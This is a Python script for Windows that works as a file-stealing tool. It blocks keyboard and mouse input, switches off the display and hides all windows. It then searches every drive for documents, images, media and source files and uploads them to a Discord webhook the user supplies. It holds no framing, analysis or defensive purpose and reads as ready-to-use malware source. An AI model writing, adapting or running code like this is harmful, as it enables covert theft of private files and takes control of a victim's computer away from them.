import os
import requests
import time
import threading
import ctypes
import win32gui
import win32con

ctypes.windll.user32.BlockInput(True)
ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

def enum_windows(hwnd, window_list):
    window_list.append(hwnd)

windows = []
win32gui.EnumWindows(enum_windows, windows)

# Hide all top-level windows
for hwnd in windows:
    if win32gui.IsWindowVisible(hwnd):
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)

# Replace with your Discord webhook URL
WEBHOOK_URL = "place your discord webhook here"
# Directories to ignore during file search
BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
MAX_FILE_SIZE_MB = 8
def check_file(file_path):
    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif','.mp4','.mp3','.py','.js','.mkv','.docx','.xls']
    max_size_mb = 8
    if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
        print(f"Skipping file {file_path} - invalid file type")
        return False
    elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
        print(f"Skipping file {file_path} - file size too large")
        return False
    elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
        print(f"Skipping file {file_path} - file requires admin privileges")
        return False
    elif any(blacklisted_dir in file_path for blacklisted_dir in BLACKLISTED_DIRS):
        print(f"Skipping file {file_path} - in blacklisted directory")
        return False
    else:
        return True    
def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            headers = {"User-Agent": "Mozilla/5.0"}  # Use a user agent to avoid Discord rate limits
            response = requests.post(WEBHOOK_URL, headers=headers, files=files)
            if response.status_code == 429:
                # Rate limit exceeded - wait for the specified time and retry the upload
                print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                time.sleep(response.json()["retry_after"]/1000)
                upload_file(file_path)
            elif response.status_code != 200:
                print(f"Failed to upload file {file_path} - error {response.status_code}")
            else:
                print(f"Successfully uploaded file {file_path}")
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")
def search_files(root_dir):
    for root, dirs, files in os.walk(root_dir):
        if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
            # Skip blacklisted directories
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if check_file(file_path):
                upload_file(file_path)
def thread_files(root_dirs):
    for root_dir in root_dirs:
        search_files(root_dir)
# Get a list of all available drives
drives = ["%s:\\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
# Split the drives into groups of 4
drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]
# Search for files in each group in parallel
for group in drive_groups:
    threads = []
    for drive in group:
        thread = threading.Thread(target=search_files, args=(drive,))
        threads.append(thread)
        thread.start()
    # Wait for all threads to finish before moving on to the next group
    for thread in threads:
        thread.join()

ctypes.windll.user32.BlockInput(False)
ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)